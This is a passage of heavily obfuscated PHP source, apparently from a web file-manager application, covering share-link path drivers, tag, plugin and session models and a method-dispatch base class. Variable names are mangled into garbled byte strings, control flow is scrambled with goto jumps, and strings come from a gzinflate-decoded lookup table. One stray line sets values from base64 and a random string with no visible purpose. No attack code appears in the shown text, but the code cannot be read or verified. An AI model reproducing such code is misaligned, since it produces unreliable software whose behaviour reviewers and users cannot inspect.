($Câ™¥ÎÔ¢ñ->pathParse[$E„å¡²°¶ä[1012]]) { $Càä…íùß = $Câ™¥ÎÔ¢ñ->pathParse[$E„å¡²°¶ä[1012]]; } else { $Càä…íùß = $fÑ÷’ôŒ„; } $Aî¤öŞ»‡ = IO::copyMove($Bì™ßÓà‘², $Càä…íùß, $E¢Åª¢óš, $eŸ™¤ƒ°·®); $Aî¤öŞ»‡ = $this->getPathOuter($Aî¤öŞ»‡); goto AÕî‚Íò; Aå “—¡•: } public function pathThis($e‹‚ğ’ÆÊ) { return get_path_this($this->pathParse[$_SERVER[ÈİÅ¿ÈÈ¥×][75]]); } public function pathFather($fæ˜·áêË) { return get_path_father($this->pathParse[$_SERVER[ÈİÅ¿ÈÈ¥×][75]]); } public function iconvSystem($EŞ´±Å¯¦) { return $EŞ´±Å¯¦; } protected function infoParse($CÏÒƒ‰¶‚¨, $bæ³ƒíèåƒ = false) { $eÅÔŸ¼³‡ï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FßŞ§ìïí´ = $this->pathParse[$eÅÔŸ¼³‡ï[454]][$eÅÔŸ¼³‡ï[1035]] . $this->pathParse[$eÅÔŸ¼³‡ï[1028]]; if ($bæ³ƒíèåƒ) { $f˜Œ¹ÌæàÔ = IO::infoWithChildren($FßŞ§ìïí´); } else { $f˜Œ¹ÌæàÔ = IO::info($FßŞ§ìïí´); } $Aì¸İïÖ»Õ = $this->pathParse[$eÅÔŸ¼³‡ï[454]]; return Action($eÅÔŸ¼³‡ï[1174])->_shareItemeParse($f˜Œ¹ÌæàÔ, $Aì¸İïÖ»Õ); } public function listAll($cØ³ÈÚÉí²) { $EÂ–ÇÎÎº© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aê£Ğ²Ç¦ = IO::listAll($cØ³ÈÚÉí²); $fÄ‚–¤ªÄÆ = $this->pathParse[$EÂ–ÇÎÎº©[454]]; foreach ($aê£Ğ²Ç¦ as &$CÍùŸÑ‰˜ø) { check_abort(); $CÍùŸÑ‰˜ø = array_merge(IO::info($CÍùŸÑ‰˜ø[$EÂ–ÇÎÎº©[75]]), $CÍùŸÑ‰˜ø); $CÍùŸÑ‰˜ø[$EÂ–ÇÎÎº©[407]] = Action($EÂ–ÇÎÎº©[1174])->_shareItemeParse($CÍùŸÑ‰˜ø, $fÄ‚–¤ªÄÆ); } unset($CÍùŸÑ‰˜ø); return $aê£Ğ²Ç¦; } public function getPathOuter($dŒ¤Á¥†·Ù) { goto bÓÆ•â¯ˆç; BÀóÂâæ³…: $BºãÁÒñãó = KodIO::clear($dŒ¤Á¥†·Ù); $e­øê©Éöã = KodIO::clear($this->pathParse[$C™Ø¿§ùÁë[454]][$C™Ø¿§ùÁë[1035]]); $CÌÊ¹„–ª = substr($BºãÁÒñãó, strlen($e­øê©Éöã)); goto bˆ¾¸ÃŞ¿…; bˆ¾¸ÃŞ¿…: if (substr($BºãÁÒñãó, 0, strlen($e­øê©Éöã)) != $e­øê©Éöã) { return !1; } return $this->pathParse[$C™Ø¿§ùÁë[1029]] . $C™Ø¿§ùÁë[8] . ltrim($CÌÊ¹„–ª, $C™Ø¿§ùÁë[8]); goto F„»í¼ŠÎÕ; bÓÆ•â¯ˆç: $C™Ø¿§ùÁë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dºø¨ªŸ¨— = KodIO::parse($dŒ¤Á¥†·Ù); if ($Dºø¨ªŸ¨—[$C™Ø¿§ùÁë[29]] == KodIO::KOD_SHARE_ITEM) { return $Dºø¨ªŸ¨—[$C™Ø¿§ùÁë[75]]; } goto BÀóÂâæ³…; F„»í¼ŠÎÕ: } public function getType() { $EÖí Ö‘Ä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e³‹–Å©»­ = str_replace($EÖí Ö‘Ä[71], $EÖí Ö‘Ä[33], get_class($this)); return strtolower($e³‹–Å©»­); } public function isTypeObject($B»ã³Ôâ†) { return IO::isTypeObject($B»ã³Ôâ†); } public function info($CŠ× ›Î) { return $this->infoParse($CŠ× ›Î); } public function infoAuth($FŸ£Ã¾›ˆ) { return $this->infoParse($FŸ£Ã¾›ˆ); } public function infoWithChildren($DŠ×‰¬³Â‡) { return $this->infoParse($DŠ×‰¬³Â‡, !0); } public function infoFull($b©ğŠ¦÷™·) { return $this->infoParse($b©ğŠ¦÷™·); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($f™­Áˆ›´) { $this->pathParse = $f™­Áˆ›´; } protected function infoParse($f‹‰¬¨¹, $A´Îƒ“Ö½É = false) { $EÕóÙËï˜­ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return Action($EÕóÙËï˜­[1034])->sharePathInfo($this->pathParse[$EÕóÙËï˜­[75]], !0, $A´Îƒ“Ö½É); } public function listPath($Dø¤‹Š‘‰Ÿ, $fÑà‚Íò¢Š = false) { $b¯ˆË•Ê‡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A±ŒŠ¢»ôÒ = IO::listPath($Dø¤‹Š‘‰Ÿ, $fÑà‚Íò¢Š); foreach ($A±ŒŠ¢»ôÒ as $eÆºë¾É²Ê => $Aİ¡Úª¾Ë¶) { if (!in_array($eÆºë¾É²Ê, array($b¯ˆË•Ê‡[73], $b¯ˆË•Ê‡[74]))) { continue; } foreach ($Aİ¡Úª¾Ë¶ as $dÃä²ªâ£ => $d”»Í‹ã‚) { $d”»Í‹ã‚ = Action($b¯ˆË•Ê‡[1183])->parsePathChildren($d”»Í‹ã‚, array($b¯ˆË•Ê‡[403] => $Dø¤‹Š‘‰Ÿ)); $A±ŒŠ¢»ôÒ[$eÆºë¾É²Ê][$dÃä²ªâ£] = Action($b¯ˆË•Ê‡[1034])->shareItemInfo($d”»Í‹ã‚); } } return $A±ŒŠ¢»ôÒ; } public function listAll($BğƒÏÈ‰) { $E˜²çÍå¤İ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eê°ÊèïÖŠ = IO::listAll($BğƒÏÈ‰); foreach ($eê°ÊèïÖŠ as &$DÜì¿²í‘…) { $DÜì¿²í‘… = array_merge(IO::info($DÜì¿²í‘…[$E˜²çÍå¤İ[75]]), $DÜì¿²í‘…); $DÜì¿²í‘…[$E˜²çÍå¤İ[407]] = Action($E˜²çÍå¤İ[1034])->shareItemInfo($DÜì¿²í‘…); } unset($DÜì¿²í‘…); return $eê°ÊèïÖŠ; } } goto bØ†Í¥‹«š; FŒ—‡¶ÉÇÛ: $aˆÓ“è¤ = $_SERVER[ÈİÅ¿ÈÈ¥×][563]; if (strlen($aˆÓ“è¤) < $_SERVER[ÈİÅ¿ÈÈ¥×][564]) { return; } $_SERVER[şìšµëâ­Æ] = explode($_SERVER[ÈİÅ¿ÈÈ¥×][565], gzinflate(substr($_SERVER[ÈİÅ¿ÈÈ¥×][566], 10, -8))); goto dæ±Ë¥íù; EÌ” ÒËÁ·: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($e¬Ö¹è†ª) { $CÒŠ«¤«ñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return array($CÒŠ«¤«ñ[1748] => array($e¬Ö¹è†ª[0], $CÒŠ«¤«ñ[1749]), $CÒŠ«¤«ñ[1750] => array($e¬Ö¹è†ª[0], $CÒŠ«¤«ñ[1751])); } protected function get($d‘çíÁ»‚Ö) { $D÷Ö»¸÷åŸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E‹ßì×ÔÈ‰ = Model($D÷Ö»¸÷åŸ[475])->metaGet($d‘çíÁ»‚Ö, $D÷Ö»¸÷åŸ[1752]); $d­†ëòñÚ = json_decode($E‹ßì×ÔÈ‰, !0); return $d­†ëòñÚ ? $d­†ëòñÚ : array($D÷Ö»¸÷åŸ[1753] => $D÷Ö»¸÷åŸ[83], $D÷Ö»¸÷åŸ[361] => array()); } protected function set($aµÁá¨ÈºŸ, $eöëÉø´Ÿ) { $D¢ßÉàµ­ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eöëÉø´Ÿ = $eöëÉø´Ÿ ? $eöëÉø´Ÿ : array($D¢ßÉàµ­[1753] => $D¢ßÉàµ­[83], $D¢ßÉàµ­[361] => array()); Model($D¢ßÉàµ­[475])->metaSet($aµÁá¨ÈºŸ, $D¢ßÉàµ­[1752], json_encode($eöëÉø´Ÿ)); return Model($D¢ßÉàµ­[475])->metaSet($aµÁá¨ÈºŸ, $D¢ßÉàµ­[1752], json_encode($eöëÉø´Ÿ)); } protected function getByTagID($aÅÇøŠÏ¾¥, $aôƒ¡ ò‰Å) { goto AÆö³ª„ŸÜ; AÆö³ª„ŸÜ: $C…ğ¹Çù©Š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$aÅÇøŠÏ¾¥ || !$aôƒ¡ ò‰Å) { return !1; } if (!Model($C…ğ¹Çù©Š[475])->getInfoSimple($aÅÇøŠÏ¾¥)) { return !1; } goto d±ƒ ö”¥»; E³¾›‰é–: return is_array($A¦Ÿ˜Æµ•á) ? $A¦Ÿ˜Æµ•á : !1; goto a¯²È‰­ë¦; d±ƒ ö”¥»: $AŠ›Ë¿ïÔÅ = $this->get($aÅÇøŠÏ¾¥); if (!$AŠ›Ë¿ïÔÅ || !isset($AŠ›Ë¿ïÔÅ[$C…ğ¹Çù©Š[361]])) { return !1; } $A¦Ÿ˜Æµ•á = array_find_by_field($AŠ›Ë¿ïÔÅ[$C…ğ¹Çù©Š[361]], $C…ğ¹Çù©Š[383], $aôƒ¡ ò‰Å); goto E³¾›‰é–; a¯²È‰­ë¦: } public function listSource($B¶Î´îŸ…, $A±ã´‰ƒ•) { goto aŠîÍè”“Ñ; bÜø‹êÁ¡ó: if (!$e¿ÒËÂ¯¾† || count($EÎêØ¿°À) == $e¿ÒËÂ¯¾†[$b÷êá§­Ÿ¶[358]][$b÷êá§­Ÿ¶[359]]) { return $e¿ÒËÂ¯¾†; } $B×ßÇÌğÌ = array(); $bã˜ƒ±Îó» = array_to_keyvalue($e¿ÒËÂ¯¾†[$b÷êá§­Ÿ¶[74]], $b÷êá§­Ÿ¶[33], $b÷êá§­Ÿ¶[385]); goto e †¢ùß£ò; aŠîÍè”“Ñ: $b÷êá§­Ÿ¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($A±ã´‰ƒ• && !is_array($A±ã´‰ƒ•)) { $A±ã´‰ƒ• = array($A±ã´‰ƒ•); } $bµÖå¢Ò– = $this->listData($B¶Î´îŸ…); goto a×«¼Âá²„; e †¢ùß£ò: $EÍ™ÊÑ­ˆÌ = array_to_keyvalue($e¿ÒËÂ¯¾†[$b÷êá§­Ÿ¶[73]], $b÷êá§­Ÿ¶[33], $b÷êá§­Ÿ¶[385]); $b®îË†³éˆ = array_merge($EÍ™ÊÑ­ˆÌ, $bã˜ƒ±Îó»); foreach ($EÎêØ¿°À as $fˆ°´”’¯Á) { if (!in_array($fˆ°´”’¯Á, $b®îË†³éˆ)) { $B×ßÇÌğÌ[] = $fˆ°´”’¯Á; } } goto eŒ…ÖŞâàë; eŒ…ÖŞâàë: if ($B×ßÇÌğÌ) { $this->removeBySource($B¶Î´îŸ…, $B×ßÇÌğÌ); } return $e¿ÒËÂ¯¾†; goto D™·™¦¥„æ; EñÃ¯ëÈé¡: foreach ($C×Æ„‹•³æ as $DÙ½Ööñõ => $d”š§Ğ—¯Õ) { $fæÇ­à’‰Ö = !0; if (!$A±ã´‰ƒ•) { $EÎêØ¿°À[] = $DÙ½Ööñõ; continue; } foreach ($A±ã´‰ƒ• as $FÉö·ˆ‡Ù°) { if (!in_array($FÉö·ˆ‡Ù°, $d”š§Ğ—¯Õ)) { $fæÇ­à’‰Ö = !1; break; } } if ($fæÇ­à’‰Ö) { $EÎêØ¿°À[] = $DÙ½Ööñõ; } } if (!$EÎêØ¿°À) { return array(); } $e¿ÒËÂ¯¾† = Model($b÷êá§­Ÿ¶[1167])->listSource(array($b÷êá§­Ÿ¶[399] => array($b÷êá§­Ÿ¶[400], $EÎêØ¿°À))); goto bÜø‹êÁ¡ó; a×«¼Âá²„: $C×Æ„‹•³æ = array(); foreach ($bµÖå¢Ò– as $dĞàªÜÈè) { $fˆ°´”’¯Á = $dĞàªÜÈè[$b÷êá§­Ÿ¶[75]]; if (!$fˆ°´”’¯Á) { continue; } if (!isset($C×Æ„‹•³æ[$fˆ°´”’¯Á])) { $C×Æ„‹•³æ[$fˆ°´”’¯Á] = array(); } $C×Æ„‹•³æ[$fˆ°´”’¯Á][] = $dĞàªÜÈè[$b÷êá§­Ÿ¶[409]]; } $EÎêØ¿°À = array(); goto EñÃ¯ëÈé¡; D™·™¦¥„æ: } protected function listData($FÉ’ÀÑ¸Œ) { $BÎÇ¢Şï»´ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eó¨Ô°É‘ = array($BÎÇ¢Şï»´[1482] => 0, $BÎÇ¢Şï»´[451] => array($BÎÇ¢Şï»´[1754], 0), $BÎÇ¢Şï»´[404] => $BÎÇ¢Şï»´[1755] . $FÉ’ÀÑ¸Œ); $aº‡Ëõ³°Ó = $BÎÇ¢Şï»´[1756]; $a‘­›î–—Å = $this->field($aº‡Ëõ³°Ó)->where($eó¨Ô°É‘)->order($BÎÇ¢Şï»´[1757])->select(); return $a‘­›î–—Å ? $a‘­›î–—Å : array(); } protected function addToTag($A¡¿Ë»Ó¯ô, $B‰ê “ç¤ù, $cØ­¦°ËùŸ) { $DñôÇ­Î =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->getByTagID($A¡¿Ë»Ó¯ô, $cØ­¦°ËùŸ) || !$B‰ê “ç¤ù) { return !1; } if (!Model($DñôÇ­Î[759])->pathInfo($B‰ê “ç¤ù)) { return !1; } $Eœ¿£¹Á·” = array($DñôÇ­Î[1482] => 0, $DñôÇ­Î[451] => $cØ­¦°ËùŸ, $DñôÇ­Î[403] => $B‰ê “ç¤ù, $DñôÇ­Î[404] => $DñôÇ­Î[1758] . $A¡¿Ë»Ó¯ô, $DñôÇ­Î[402] => $DñôÇ­Î[33], $DñôÇ­Î[1654] => 0); if ($this->where($Eœ¿£¹Á·”)->find()) { return !1; } return $this->add($Eœ¿£¹Á·”); } protected function removeFromTag($d¡Ï‚İÒ£î, $e‰‚Ìª¿Î, $Aîõåã”à) { $D¥¦‰ÂÅ—Ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->getByTagID($d¡Ï‚İÒ£î, $Aîõåã”à) || !$e‰‚Ìª¿Î) { return !1; } if (is_array($e‰‚Ìª¿Î)) { $e‰‚Ìª¿Î = array($D¥¦‰ÂÅ—Ë[7], $e‰‚Ìª¿Î); } $EÍ“ªä¬“ = array($D¥¦‰ÂÅ—Ë[1482] => 0, $D¥¦‰ÂÅ—Ë[451] => $Aîõåã”à, $D¥¦‰ÂÅ—Ë[404] => $D¥¦‰ÂÅ—Ë[1758] . $d¡Ï‚İÒ£î, $D¥¦‰ÂÅ—Ë[403] => $e‰‚Ìª¿Î); return $this->where($EÍ“ªä¬“)->delete(); } protected function removeByTag($cÓâôå×Ù®, $e³Ë†®Ÿ–Õ) { $eÉ–ÊØ§±¥ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->getByTagID($cÓâôå×Ù®, $e³Ë†®Ÿ–Õ)) { return !1; } $Fˆ´ŠƒÑÜ = array($eÉ–ÊØ§±¥[1482] => 0, $eÉ–ÊØ§±¥[451] => $e³Ë†®Ÿ–Õ, $eÉ–ÊØ§±¥[404] => $eÉ–ÊØ§±¥[1758] . $cÓâôå×Ù®); return $this->where($Fˆ´ŠƒÑÜ)->delete(); } protected function removeBySource($C¬Ù ïÃ—Ğ, $fÏÆğØâŠ—) { $a¦§—Ç´¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$C¬Ù ïÃ—Ğ || !$fÏÆğØâŠ—) { return !1; } if (is_array($fÏÆğØâŠ—)) { $fÏÆğØâŠ— = array($a¦§—Ç´¶[7], $fÏÆğØâŠ—); } $d¦µóÂÇÄÈ = array($a¦§—Ç´¶[1482] => 0, $a¦§—Ç´¶[403] => $fÏÆğØâŠ—, $a¦§—Ç´¶[451] => array($a¦§—Ç´¶[936], 0), $a¦§—Ç´¶[404] => $a¦§—Ç´¶[1758] . $C¬Ù ïÃ—Ğ); return $this->where($d¦µóÂÇÄÈ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x70\154\x75\147\151\156\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\163\x74\141\164\165\163", "\x72\x65\147\x69\x65\x73\164", "\143\x6f\156\x66\x69\147"); public function loadList($DÛÆßù¸¨˜ = false) { $Aîù´íÛ‚… = array_to_keyvalue($this->listData(), $_SERVER[ÈİÅ¿ÈÈ¥×][28]); if ($DÛÆßù¸¨˜) { return $Aîù´íÛ‚…[$DÛÆßù¸¨˜]; } return $Aîù´íÛ‚…; } public function init() { $dÄ®ÉË¹Èã =& $_SERVER[ÈİÅ¿ÈÈ¥×]; Hook::trigger($dÄ®ÉË¹Èã[1759]); $aŒˆøÓ÷‰ = $this->loadPluginList(); foreach ($aŒˆøÓ÷‰ as $bÆœëŞîÔ¤ => $F„Ê¨ºÖê) { $bìßÅÈÖï« = $this->appAllow($bÆœëŞîÔ¤, $F„Ê¨ºÖê); if (!$bìßÅÈÖï«) { continue; } foreach ($F„Ê¨ºÖê[$dÄ®ÉË¹Èã[1760]] as $C…Æ–£œ‘ => $Dğ¤âõò±) { Hook::bind($C…Æ–£œ‘, $Dğ¤âõò±); } } Hook::trigger($dÄ®ÉË¹Èã[1761]); Hook::trigger(ACTION); } public function appAllow($E±º¡„º¿¡, $dãæ•ÁÎ˜—, $DäÀØ¥ªî÷ = true) { $E™öäàƒÑ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CØ¤ƒÌ»‹ = PLUGIN_DIR . $E±º¡„º¿¡ . $E™öäàƒÑ[1762]; if (!is_array($dãæ•ÁÎ˜—) || !is_array($dãæ•ÁÎ˜—[$E™öäàƒÑ[1760]]) || $dãæ•ÁÎ˜—[$E™öäàƒÑ[697]] != 1 || !is_file($CØ¤ƒÌ»‹)) { return !1; } if ($GLOBALS[$E™öäàƒÑ[474]] == 1) { return !0; } if ($DäÀØ¥ªî÷ && !Action($E™öäàƒÑ[1763])->checkAuth($E±º¡„º¿¡)) { return !1; } return !0; } public function unInstall($bˆ±İ¤è×) { $dğ‘ë¹ëÃÇ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B¥¶¹»…ô† = $this->loadList($bˆ±İ¤è×); if (file_exists(PLUGIN_DIR . $bˆ±İ¤è×)) { Hook::apply($bˆ±İ¤è× . $dğ‘ë¹ëÃÇ[1764]); } $this->remove($B¥¶¹»…ô†[$dğ‘ë¹ëÃÇ[383]]); } public function changeStatus($bã©õ´å¤±, $C‘ä¨†Œ™) { $A†ìŞÒà‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eæ¶‰×¬ù = $this->loadList($bã©õ´å¤±); if ($C‘ä¨†Œ™) { Hook::apply($bã©õ´å¤± . $A†ìŞÒà‰[1765]); } $this->update($eæ¶‰×¬ù[$A†ìŞÒà‰[383]], array($A†ìŞÒà‰[1766] => $C‘ä¨†Œ™)); } public function appRegist($cæÄœë†Œñ, $Aãƒ±ªÁ£) { $FĞ®Ó˜´Á© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e™Ç·Â§ö = $this->loadList($cæÄœë†Œñ); if ($e™Ç·Â§ö) { $this->update($e™Ç·Â§ö[$FĞ®Ó˜´Á©[383]], array($FĞ®Ó˜´Á©[1760] => $Aãƒ±ªÁ£)); } else { $eœø¾ØŸ = array($FĞ®Ó˜´Á©[28] => $cæÄœë†Œñ, $FĞ®Ó˜´Á©[1760] => $Aãƒ±ªÁ£, $FĞ®Ó˜´Á©[697] => 0, $FĞ®Ó˜´Á©[6] => $this->getConfigDefault($cæÄœë†Œñ)); $this->insert($eœø¾ØŸ); } } public function getConfigDefault($CÖ¸ÙÔµ¬ö) { $D¨Èø§ã”Ÿ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Fó…‚Üæ‡‡ = array(); $FÛ–³ìÃø = $this->getPackageJson($CÖ¸ÙÔµ¬ö); if (!$FÛ–³ìÃø && is_array($FÛ–³ìÃø[$D¨Èø§ã”Ÿ[1767]])) { return $Fó…‚Üæ‡‡; } foreach ($FÛ–³ìÃø[$D¨Èø§ã”Ÿ[1767]] as $CŒÈ×ô†• => $EˆÒ£µ Ã) { if (!isset($EˆÒ£µ Ã[$D¨Èø§ã”Ÿ[366]]) || isset($Fó…‚Üæ‡‡[$CŒÈ×ô†•])) { continue; } $Fó…‚Üæ‡‡[$CŒÈ×ô†•] = $EˆÒ£µ Ã[$D¨Èø§ã”Ÿ[366]]; } return $Fó…‚Üæ‡‡; } public function getPackageJson($EÍ‰á„±¯Ô) { return Hook::apply($EÍ‰á„±¯Ô . $_SERVER[ÈİÅ¿ÈÈ¥×][1768]); } public function getConfig($cŒêÑåŸ›, $c‘ ¶‚ŸÅ = false) { $AŒî×†‚«‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F–£Ã¢š§È = array(); $AÂŒ¤ßò¶Á = $this->loadList($cŒêÑåŸ›); if ($AÂŒ¤ßò¶Á && is_array($AÂŒ¤ßò¶Á[$AŒî×†‚«‘[6]])) { $F–£Ã¢š§È = $AÂŒ¤ßò¶Á[$AŒî×†‚«‘[6]]; } if (!$F–£Ã¢š§È || $c‘ ¶‚ŸÅ) { $F–£Ã¢š§È = $this->getConfigDefault($cŒêÑåŸ›); } return $F–£Ã¢š§È; } public function setConfig($f£ù¬Õ•, $E¸©¹èèäõ = false) { goto b”¤‚ªĞÛ‘; Fµà¥àùâ—: $d¯‡õ†©Õİ = $B›³­˜‡à[$F±åÜöí§Š[6]]; if ($E¸©¹èèäõ == !1) { $d¯‡õ†©Õİ = array(); $E¸©¹èèäõ = $this->getConfigDefault($f£ù¬Õ•); } foreach ($E¸©¹èèäõ as $cóÑİåÚà­ => $A‡¯„™ª¦é) { $d¯‡õ†©Õİ[$cóÑİåÚà­] = is_string($A‡¯„™ª¦é) ? trim($A‡¯„™ª¦é) : $A‡¯„™ª¦é; } goto a¤²·º¥ëë; b”¤‚ªĞÛ‘: $F±åÜöí§Š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B›³­˜‡à = $this->loadList($f£ù¬Õ•); if (!$B›³­˜‡à) { return !1; } goto Fµà¥àùâ—; a¤²·º¥ëë: $this->update($B›³­˜‡à[$F±åÜöí§Š[383]], array($F±åÜöí§Š[6] => $d¯‡õ†©Õİ)); goto BÊª§š”ƒ; BÊª§š”ƒ: } public function viewList() { goto fìÖç° š ; fìÖç° š : $AÌ»¢„Á¨Ü =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b°¹ÍÂ‰·é = $this->loadList(); $this->pluginScan($b°¹ÍÂ‰·é); goto C»ÁÕˆ²Ÿñ; C»ÁÕˆ²Ÿñ: $b°¹ÍÂ‰·é = $this->loadPluginList(); $D•Î¡ÜªÂ = array(); foreach ($b°¹ÍÂ‰·é as $EŸøàéãò÷ => $Fí°é™–‘…) { unset($Fí°é™–‘…[$AÌ»¢„Á¨Ü[1760]], $Fí°é™–‘…[$AÌ»¢„Á¨Ü[6]]); $dêªŠİá = PLUGIN_DIR . $Fí°é™–‘…[$AÌ»¢„Á¨Ü[28]] . $AÌ»¢„Á¨Ü[1762]; if (!is_file($dêªŠİá)) { continue; } $e ›§Úğİ = Hook::apply($Fí°é™–‘…[$AÌ»¢„Á¨Ü[28]] . $AÌ»¢„Á¨Ü[1768]); if (is_array($e ›§Úğİ)) { $D•Î¡ÜªÂ[$EŸøàéãò÷] = array_merge($Fí°é™–‘…, $e ›§Úğİ); } } goto DÊ¹¬ÊÑá; DÊ¹¬ÊÑá: return $D•Î¡ÜªÂ; goto e±‘çâäï–; e±‘çâäï–: } private function loadPluginList() { $AˆêåÒ˜ÄÎ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fçÖ¾ÒÜŠæ = $this->loadList(); if (strtolower(MOD) == $AˆêåÒ˜ÄÎ[1769]) { return $fçÖ¾ÒÜŠæ; } $DšñˆÕƒ‰‚ = Hook::trigger($AˆêåÒ˜ÄÎ[1770], $fçÖ¾ÒÜŠæ); if ($fçÖ¾ÒÜŠæ && !$DšñˆÕƒ‰‚) { die; } return $DšñˆÕƒ‰‚ ? $DšñˆÕƒ‰‚ : $fçÖ¾ÒÜŠæ; } private function pluginScan($E¶Áš‰’ìÜ) { $C³²³ÌÖå =& $_SERVER[ÈİÅ¿ÈÈ¥×]; recursion_dir(PLUGIN_DIR, $B£·„”ï‘„, $b¬ƒœÓ§¬, 0); foreach ($B£·„”ï‘„ as $Cœ…®Ö¼¬) { $B•­¯”·Ì¸ = get_path_this($Cœ…®Ö¼¬); if (isset($E¶Áš‰’ìÜ[$B•­¯”·Ì¸]) || !file_exists($Cœ…®Ö¼¬ . $C³²³ÌÖå[1771]) || !file_exists($Cœ…®Ö¼¬ . $C³²³ÌÖå[1762])) { continue; } Hook::apply($B•­¯”·Ì¸ . $C³²³ÌÖå[1765]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\155\x5f\x73\x65\163\163\x69\157\x6e"; public function get($eñòå¢­‚ˆ) { $a†‚Î±ÀÈ· =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cŒ—‡Ö†¹ô = $this->where(array($a†‚Î±ÀÈ·[1772] => $eñòå¢­‚ˆ))->find(); if (!is_array($cŒ—‡Ö†¹ô)) { return !1; } return $cŒ—‡Ö†¹ô[$a†‚Î±ÀÈ·[700]]; } public function set($A°…ò®¸“, $d¥¶”³œËĞ, $bî‰Ø¯¾×› = 3600) { $bø»ô¦ÙØ¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D”ÕâÃŒ©Š = array($bø»ô¦ÙØ¦[1772] => $A°…ò®¸“, $bø»ô¦ÙØ¦[1684] => $d¥¶”³œËĞ, $bø»ô¦ÙØ¦[1773] => $bî‰Ø¯¾×› + time()); if (Session::get($bø»ô¦ÙØ¦[1774])) { $D”ÕâÃŒ©Š[$bø»ô¦ÙØ¦[1490]] = Session::get($bø»ô¦ÙØ¦[1774]); } else { $D”ÕâÃŒ©Š[$bø»ô¦ÙØ¦[1490]] = 0; } if ($this->get($A°…ò®¸“)) { return $this->where(array($bø»ô¦ÙØ¦[1772] => $A°…ò®¸“))->save($D”ÕâÃŒ©Š); } else { return $this->add($D”ÕâÃŒ©Š, array(), !0); } } public function remove($dÜ“ã„÷») { return $this->where(array($_SERVER[ÈİÅ¿ÈÈ¥×][1772] => $dÜ“ã„÷»))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÈİÅ¿ÈÈ¥×][1775] . time())->delete(); } } goto BĞÎá»¾Ä; fƒÆŞÒÃä: function binCheckBigger($CéóÃ ããÙ, $AÁæÒÙÒ¶é) { return $CéóÃ ããÙ > $AÁæÒÙÒ¶é; } $_SERVER[$_SERVER[][3]] = ("\70\70\60\67".base64_decode('Njg='))+0;$_MFRk="2Zcx5nemtPhS7GdzaC8ppZs7XPgcJTyMHbdvVCaRxK6E8WAkQYsrAdZ4kBy5tkvUfJGzu";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Eî†ó•Ğö, $d ŒªÑÍ¾¤) { $BÖ‚ˆ¯Ô±‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset(self::$_methodList[$Eî†ó•Ğö])) { return @call_user_func_array(self::$_methodList[$Eî†ó•Ğö], $d ŒªÑÍ¾¤); } else { if (method_exists($this, $Eî†ó•Ğö)) { return call_user_func_array(array($this, $Eî†ó•Ğö), $d ŒªÑÍ¾¤); } else { think_exception(__CLASS__ . $BÖ‚ˆ¯Ô±‚[4] . $Eî†ó•Ğö . $BÖ‚ˆ¯Ô±‚[5]); } } } public static function __callStatic($e´™±‡™â, $eøíŸƒÏÒó) { if (isset(self::$_methodListStatic[$e´™±‡™â])) { return call_user_func_array(self::$_methodListStatic[$e´™±‡™â], $eøíŸƒÏÒó); } else { if (method_exists(self, $e´™±‡™â)) { return call_user_func_array(array(self, $e´™±‡™â), $eøíŸƒÏÒó); } else { show_json("{$e´™±‡™â}\x28\51\x20\156\x6f\164\x20\145\170\x69\x73\164\73", !1); } } } public static function addMethod($FÉñÇº•ƒ‚, $e§‡×–ÍÒÛ) { self::$_methodList[$FÉñÇº•ƒ‚] = $e§‡×–ÍÒÛ; } public static function addMethodStatic($BïÊÒ¯´çÈ, $eÚ´‹¼œ„á) { self::$_methodListStatic[$BïÊÒ¯´çÈ] = $eÚ´‹¼œ„á; } } goto eîÕƒ›Şâ·; dÁÖ°éË°ì: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\x54\x69\155\145", "\x74\151\x6d\145", "\151\156\163\145\x72\164\54\x75\160\144\141\x74\145", "\146\165\156\x63\164\x69\157\x6e"), array("\x63\162\x65\141\x74\x65\124\151\155\145", "\164\x69\x6d\145", "\x69\x6e\163\x65\162\x74", "\146\165\156\143\164\x69\157\x6e")); public function setDataAuto($b½ÊÌÓè¢Ï) { $this->dataAuto = $b½ÊÌÓè¢Ï; } public function __construct($Cæ“Î«î÷Ó = '', $Aä„Ú§ŒÃ = '', $b§‹ó‹ùß‚ = '') { parent::__construct($Cæ“Î«î÷Ó, $Aä„Ú§ŒÃ, $b§‹ó‹ùß‚); } public static function textEncode($EñùÓ¥™èâ) { if 